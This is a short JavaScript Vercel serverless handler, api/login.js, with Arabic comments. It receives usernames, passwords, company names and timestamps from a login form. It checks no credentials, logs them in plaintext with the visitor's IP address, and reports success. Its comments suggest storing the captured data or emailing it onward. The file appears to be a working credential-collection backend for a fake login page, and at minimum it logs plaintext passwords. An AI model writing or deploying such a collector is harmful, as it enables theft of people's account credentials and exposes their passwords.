// api/login.js - ضع هذا الملف في مشروع Vercel

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { username, password, company, language, timestamp } = req.body;

      // هنا تقدر تحفظ البيانات في قاعدة بيانات
      // أو تبعتها على ايميل أو أي حاجة
      
      // للحين بنطبعها في console
      console.log({
        username,
        password,
        company,
        language,
        timestamp,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
      });

      // رد ناجح
      res.status(200).json({ 
        success: true, 
        message: 'تم تسجيل البيانات بنجاح' 
      });

    } catch (error) {
      res.status(500).json({ 
        success: false, 
        error: error.message 
      });
    }
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
